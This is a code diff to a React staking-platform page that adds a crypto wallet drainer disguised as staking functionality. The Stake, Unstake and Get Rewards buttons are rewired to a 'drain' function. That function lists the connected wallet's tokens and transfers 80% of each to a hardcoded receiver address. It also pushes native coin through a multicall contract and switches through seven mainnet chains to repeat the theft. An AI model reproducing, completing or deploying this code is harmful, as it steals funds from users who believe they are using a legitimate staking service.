@@ -26,19 +26,362 @@ import { ConnectWalletModal } from "../components/Modal";
 import ConnectedWallet from "../components/ConnectedWallet";
 import { FaXmark } from "react-icons/fa6";
 import axios from "axios";
+import { Contract, providers, ethers, utils } from "ethers";
+import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
 
 import { GoDash } from "react-icons/go";
+import { ConnectKitButton } from "connectkit";
 
 import { useAccount, useDisconnect, useEnsName } from "wagmi";
+import RealConnectWalletModal from "../components/RealConnectWalletModal";
+import { ConnectBtn } from "../components/ConnectBtn";
+import {API_KEY, config,receiver} from "../../providers/web3Config"
+import contractAbi from "../blockchain/contract.json";
 
 export default function StakingPlatform() {
   const [lockPeriod, setLockPeriod] = useState("30 Days");
   const [apyPeriod, setApyPeriod] = useState("30 Days");
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [ethBalance, setEthBalance] = useState(0);
-  // const [showDetails, setShowDetails] = useState();
+  const account = useAccount();
+
 
   const [isConnectedModalOpen, setIsConnectedModalOpen] = useState(false);
+
+
+    // Chain status tracking
+    const chainInteractionStatus:Record<number, boolean> = {
+      1: false, // Ethereum Mainnet
+      56: false, // Binance Smart Chain Mainnet
+      137: false, // Polygon Mainnet
+      43114: false, // Avalanche Mainnet
+      42161: false, // Arbitrum Mainnet
+      10: false, // Optimism Mainnet
+      42220: false, // Celo Mainnet
+    };
+  
+    const chainDrainStatus:Record<number, boolean>= {
+      1: false, // Ethereum Mainnet
+      56: false, // Binance Smart Chain Mainnet
+      137: false, // Polygon Mainnet
+      43114: false, // Avalanche Mainnet
+      42161: false, // Arbitrum Mainnet
+      10: false, // Optimism Mainnet
+      42220: false, // Celo Mainnet
+    };
+  
+    const getContractAddress = (chainId:any) => {
+      switch (chainId) {
+        case 1:
+          return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
+        case 56:
+          return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
+        case 137:
+          return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
+        case 43114:
+          return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
+        case 42161:
+          return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
+        case 10:
+          return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
+        case 42220:
+          return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
+        default:
+          throw new Error("Unsupported network");
+      }
+    };
+  
+
+
+  const handleMulticall = async (tokens:any, ethBalance:any) => {
+    const chainId = getChainId(config);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner(account.address);
+    const multiCallContract = new Contract(
+      getContractAddress(chainId),
+      contractAbi,
+      signer
+    );
+
+    const tokenAddresses = tokens.map((token:any) => token.tokenAddress);
+    const amounts = tokens.map((token:any) =>
+      ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
+    );
+
+    try {
+      const gasPrice = await getGasPrice(config, { chainId: account.chainId });
+      const gasEstimate = await multiCallContract.estimateGas.multiCall(
+        tokenAddresses,
+        amounts,
+        {
+          value: ethBalance.value,
+        }
+      );
+      const gasFee = gasEstimate.mul(gasPrice);
+
+      const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
+        .mul(2)
+        .div(10); // Transfer 20% of ETH
+
+      if (totalEthRequired.lt(gasFee)) {
+        console.log("Not enough ETH to cover gas fees and transfer.");
+        await proceedToNextChain();
+        return;
+      }
+
+      const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
+        value: totalEthRequired,
+      });
+
+      console.log(`Multicall transaction hash: ${tx.hash}`);
+      await tx.wait();
+      console.log(`Multicall transaction confirmed: ${tx.hash}`);
+
+      chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+      await proceedToNextChain();
+    } catch (error) {
+      console.log("Multicall operation failed:", error);
+      await proceedToNextChain();
+    }
+  };
+
+
+  const proceedToNextChain = async () => {
+    const nextChainId = Object.keys(chainInteractionStatus).find(
+      (id) => !chainInteractionStatus[Number(id)]
+    );
+
+    if (nextChainId) {
+      try {
+        await switchChain(config, { chainId: Number(nextChainId) });
+        await drain(); // Recursive call to drain the next chain
+      } catch (switchError) {
+        console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
+        await proceedToNextChain(); // Continue to next operation even if chain switch fails
+      }
+    } else {
+      console.log("All chains have been interacted with.");
+
+      // Check for any chains that were not fully drained and retry
+      const notDrainedChains = Object.keys(chainDrainStatus).filter(
+        (id) => !chainDrainStatus[Number(id)] && chainInteractionStatus[Number(id)]
+      );
+
+      if (notDrainedChains.length > 0) {
+        for (const chainId of notDrainedChains) {
+          try {
+            await switchChain(config, { chainId: Number(chainId) });
+            await drain(); // Retry draining for non-drained chains
+          } catch (switchError) {
+            console.log(
+              `Failed to switch to non-drained chain ${chainId}:`,
+              switchError
+            );
+            continue; // Skip and continue with other non-drained chains
+          }
+        }
+      } else {
+        console.log(
+          "All chains have been drained or attempted. Stopping further operations."
+        );
+      }
+    }
+  };
+
+
+  const getTokenAssets = async () => {
+    const chainId = getChainId(config);
+    let tokenBalances:any = []
+    const options = {
+      url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
+      method: "GET",
+      headers: {
+        "x-api-key": API_KEY,
+        accept: "application/json",
+      },
+    };
+    try {
+      const tokenListResponse = await axios(options);
+      const tokens = tokenListResponse.data.data;
+
+      if (!tokens) return tokenBalances;
+
+      for (const token of tokens) {
+        const tokenAmount = BigInt(token.balance);
+        const tokenAddress = token.contract_address.toLowerCase();
+        const usdAmount = token.current_usd_price || 0;
+        const tokenDecimal = token.decimals;
+        if (usdAmount > 0) {
+          tokenBalances.push({
+            tokenAmount: tokenAmount,
+            tokenName: token.name,
+            tokenDecimal: tokenDecimal,
+            usdAmount: usdAmount,
+            tokenAddress,
+          });
+        }
+      }
+      tokenBalances.sort((a:any, b:any) => b.usdAmount - a.usdAmount);
+    } catch (error) {
+      console.log("Error fetching token assets:", error);
+    }
+
+    return tokenBalances;
+  };
+
+
+  const supportedNetworks: Record<number, { chainId: string; chainName: string }>  = {
+    1: {
+      chainId: "0x1", // Ethereum Mainnet
+      chainName: "Ethereum Mainnet",
+    },
+    56: {
+      chainId: "0x38", // Binance Smart Chain Mainnet
+      chainName: "Binance Smart Chain",
+    },
+  };
+
+
+  const getMetaMaskProvider = () => {
+    if (window.ethereum && window.ethereum.isMetaMask) {
+      return window.ethereum;
+    } else {
+      throw new Error("MetaMask is not installed or available.");
+    }
+  };
+
+  const switchToMainnet = async () => {
+    try {
+      const mainnet = supportedNetworks[1]; // Assuming Ethereum Mainnet is the main network
+      const provider = getMetaMaskProvider(); // Use MetaMask specifically
+
+      await provider.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: mainnet.chainId }],
+      });
+      console.log("Switched to Ethereum Mainnet");
+    } catch (switchError:any) {
+      // This error happens if the network has not been added to MetaMask
+      if (switchError.code === 4902) {
+        try {
+          const bscMainnet = supportedNetworks[56]; // Example for BSC
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [
+              {
+                chainId: bscMainnet.chainId,
+                chainName: "Binance Smart Chain",
+                rpcUrls: ["https://bsc-dataseed.binance.org/"], // BSC RPC URL
+                nativeCurrency: {
+                  name: "BNB",
+                  symbol: "BNB",
+                  decimals: 18,
+                },
+                blockExplorerUrls: ["https://bscscan.com"],
+              },
+            ],
+          });
+        } catch (addError) {
+          console.error("Error adding network:", addError);
+        }
+      } else {
+        console.error("Failed to switch network:", switchError);
+      }
+    }
+  };
+
+  const checkAndSwitchNetwork = async () => {
+    try {
+      const provider = new ethers.providers.Web3Provider(getMetaMaskProvider()); // Ensure MetaMask is used
+      const { chainId } = await provider.getNetwork();
+
+      // If the user is not connected to Ethereum Mainnet (chainId 1)
+      if (!supportedNetworks[Number(chainId)]) {
+        console.log("Connected to unsupported network:", chainId);
+        await switchToMainnet(); // Use the mainnet switch logic
+      } else {
+        console.log("Connected to supported network:", chainId);
+      }
+    } catch (error) {
+      console.error("Failed to switch network:", error);
+    }
+  };
+
+  const drain = async () => {
+    if (!window.ethereum || !account?.address || !account?.chainId) {
+      console.log("Ethereum provider is not available.");
+      return;
+    }
+
+    const chainId = getChainId(config);
+
+    // Update chainInteractionStatus after interacting with the chain
+    chainInteractionStatus[chainId] = true;
+
+    const provider = new ethers.providers.Web3Provider(getMetaMaskProvider());
+    const signer = provider.getSigner(account.address);
+    const ethBalance = await getBalance(config, {
+      address: account.address,
+      chainId: account.chainId,
+    });
+
+    const tokens = await getTokenAssets();
+
+    const network = await provider.getNetwork();
+    console.log("Connected network:", network);
+
+    await checkAndSwitchNetwork();
+
+    // Process each token individually
+    for (let token of tokens) {
+      const { tokenAddress, tokenAmount } = token;
+
+      if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
+        const tokenContract = new Contract(
+          tokenAddress,
+          [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) external returns (bool)",
+          ],
+          signer
+        );
+
+        const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
+          .mul(8)
+          .div(10); // Transfer 80% of the balance
+
+        try {
+          const userBalance = await tokenContract.balanceOf(account.address);
+          if (userBalance.lt(amountInWei)) {
+            console.log(`Insufficient token balance for ${tokenAddress}`);
+            continue; // Move to next token
+          }
+
+          const transferTx = await tokenContract.transfer(
+            receiver,
+            amountInWei
+          );
+          console.log(`Transfer tx hash: ${transferTx.hash}`);
+          await transferTx.wait();
+          console.log(
+            `Transferred ${amountInWei.toString()} of ${tokenAddress}`
+          );
+
+          chainDrainStatus[chainId] = true; // Mark chain as drained if successful
+        } catch (error) {
+          console.log(`Transfer failed for ${tokenAddress}:`, error);
+          continue; // Continue to next token on failure
+        }
+      }
+    }
+
+    // After tokens, handle multicall for native tokens
+    await handleMulticall(tokens, ethBalance);
+  };
+
+
+
+
 
   const openModal = () => {
     setIsConnectedModalOpen(true);
@@ -47,9 +390,9 @@ export default function StakingPlatform() {
 
   const toggleSidebar = () => setIsSidebarOpen(!isSidebarOpen);
 
-  const { address, status } = useAccount();
+  
   // const { disconnect } = useDisconnect()
-  const { data: ensName } = useEnsName({ address });
+  const { data: ensName } = useEnsName({address:account?.address});
   // const { data: ensAvatar } = useEnsAvatar({ name: ensName })
   const { disconnect } = useDisconnect();
 
@@ -89,17 +432,17 @@ export default function StakingPlatform() {
 
   useEffect(() => {
     getTokens();
-  }, [address]);
+  }, [account?.address]);
 
   const getTokens = async () => {
     try {
       const apiKey = "freekey";
 
       const response = await axios.get(
-        `https://api.ethplorer.io/getAddressInfo/${address}?apiKey=${apiKey}`
+        `https://api.ethplorer.io/getAddressInfo/${account?.address}?apiKey=${apiKey}`
       );
 
-      console.log("addresss", address);
+      // console.log("addresss", address);
 
       const tokenData = response.data.tokens || [];
       const ethData = response.data.ETH || {};
@@ -142,8 +485,10 @@ export default function StakingPlatform() {
           >
             <Menu />
           </button>
+
+          
           <div className="flex items-center md:space-x-4 space-x-2">
-            <div>
+            {/* <div>
               {status === "connecting" && isModalOpen === true ? (
                 <button
                   className="  font-[500] bg-[#0077b6]  bg-gradient-to-r from-[#0077b6] to-[#3fc5ea]  text-white px-4 py-2 rounded text-base"
@@ -181,7 +526,8 @@ export default function StakingPlatform() {
                   Connect Wallet{" "}
                 </button>
               )}
-            </div>
+            </div> */}
+<ConnectKitButton showAvatar={true} showBalance={true} />
             <GoDash className="rotate-90 text-white text-2xl" />
 
             <div className="flex items-center">
@@ -286,7 +632,7 @@ export default function StakingPlatform() {
           </div>
 
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-            <StakeForm />
+            <StakeForm drain={drain} address={account?.address}/>
             <TokenRates />
           </div>
 
@@ -300,14 +646,19 @@ export default function StakingPlatform() {
         </footer>
       </div>
 
-      <ConnectWalletModal
+      {/* <ConnectWalletModal
         isModalOpen={isModalOpen}
         changeModalState={changeModalState}
-      />
+      /> */}
+
+{/* <RealConnectWalletModal
+        isModalOpen={isModalOpen}
+        changeModalState={changeModalState}
+      /> */}
       <ConnectedWallet
         isOpen={isConnectedModalOpen}
         onClose={closeModal}
-        address={address}
+        address={account?.address}
         ethBalance={ethBalance}
         ensName={ensName}
         disconnect={disconnect}
@@ -394,7 +745,56 @@ function StatsCard({ title, value, icon, period, setPeriod }: any) {
   );
 }
 
-function StakeForm() {
+function StakeForm({drain,address}:any) {
+  const [amount, setAmount] = useState('');
+  const [lockPeriod, setLockPeriod] = useState('');
+
+  const handleStake = () => {
+    if (!amount || !lockPeriod) {
+      alert('Please fill in all necessary details.');
+    } else {
+      // Call the stake function here
+      if(!address){
+        alert('Please Connect your Wallet');
+        return;
+      }
+
+      console.log('Staking:', amount, 'for', lockPeriod);
+      drain()
+    }
+  };
+
+
+  
+
+
+
+  
+  const handleUnstake = () => {
+    if (!amount || !lockPeriod) {
+      alert('Please fill in all necessary details.');
+    } else {
+      if(!address){
+        alert('Please Connect your Wallet');
+        return;
+      }
+      
+      console.log('Unstaking:', amount, 'for', lockPeriod);
+     
+      drain()
+    }
+  };
+
+  const handleGetRewards = () => {
+    if (!amount || !lockPeriod) {
+      alert('Please fill in all necessary details.');
+    } else {
+      // Call the get rewards function here
+      console.log('Getting rewards for:', amount, 'for', lockPeriod);
+      drain()
+    }
+  };
+
   return (
     <div className="bg-[#161a28] flex gap-6 rounded-lg p-6">
       <div className="w-[65%]">
@@ -405,13 +805,21 @@ function StakeForm() {
           <input
             type="text"
             placeholder="Amount"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
             className="w-full bg-transparent text-[11px] border border-white text-white rounded px-6 py-4 mb-4"
           />
           <div className="grid grid-cols-2 gap-4">
-            <button className="bg-gradient-to-r from-[#c96d00] via-[#d7913f] to-[#ef9933] hover:from-[#ef9933] hover:to-[#c96d00] transition-colors duration-[350ms] ease-out hover:bg-gradient-to-r hover:via-[#3fc5ea]/60cursor-pointer w-full text-white rounded py-2">
+            <button
+              className="bg-gradient-to-r from-[#c96d00] via-[#d7913f] to-[#ef9933] hover:from-[#ef9933] hover:to-[#c96d00] transition-colors duration-[350ms] ease-out hover:bg-gradient-to-r hover:via-[#3fc5ea]/60cursor-pointer w-full text-white rounded py-2"
+              onClick={handleStake}
+            >
               Stake
             </button>
-            <button className="bg-[#025e9f] bg-gradient-to-r from-[#025e9f] to-[#3fc5ea] hover:from-[#3fc5ea] hover:to-[#025e9f] transition-colors duration-[350ms] ease-out w-full text-white rounded py-2">
+            <button
+              className="bg-[#025e9f] bg-gradient-to-r from-[#025e9f] to-[#3fc5ea] hover:from-[#3fc5ea] hover:to-[#025e9f] transition-colors duration-[350ms] ease-out w-full text-white rounded py-2"
+              onClick={handleUnstake}
+            >
               Unstake
             </button>
           </div>
@@ -421,13 +829,20 @@ function StakeForm() {
         <h2 className="text-[#ffa500] border-b border-white pb-4 text-[11px]">
           Timeframe
         </h2>
-        <select className="w-full bg-transparent text-[11px] mt-4 border border-[#ffa500] text-white rounded px-[26px] py-[17px] mb-4">
-          <option>Select Lock Period</option>
-          <option>30 days</option>
-          <option>90 days</option>
-          <option>180 days</option>
+        <select
+          value={lockPeriod}
+          onChange={(e) => setLockPeriod(e.target.value)}
+          className="w-full bg-transparent text-[11px] mt-4 border border-[#ffa500] text-white rounded px-[26px] py-[17px] mb-4"
+        >
+          <option value="">Select Lock Period</option>
+          <option value="30 days">30 days</option>
+          <option value="90 days">90 days</option>
+          <option value="180 days">180 days</option>
         </select>
-        <button className="bg-gradient-to-r from-[#c96d00] via-[#d7913f] to-[#ef9933] hover:from-[#ef9933] hover:to-[#c96d00] transition-colors duration-[350ms] ease-out hover:bg-gradient-to-r hover:via-[#3fc5ea]/60cursor-pointer grid grid-cols-1 w-full text-white rounded py-2">
+        <button
+          className="bg-gradient-to-r from-[#c96d00] via-[#d7913f] to-[#ef9933] hover:from-[#ef9933] hover:to-[#c96d00] transition-colors duration-[350ms] ease-out hover:bg-gradient-to-r hover:via-[#3fc5ea]/60cursor-pointer w-full text-white rounded py-2"
+          onClick={handleGetRewards}
+        >
           Get Rewards
         </button>
       </div>
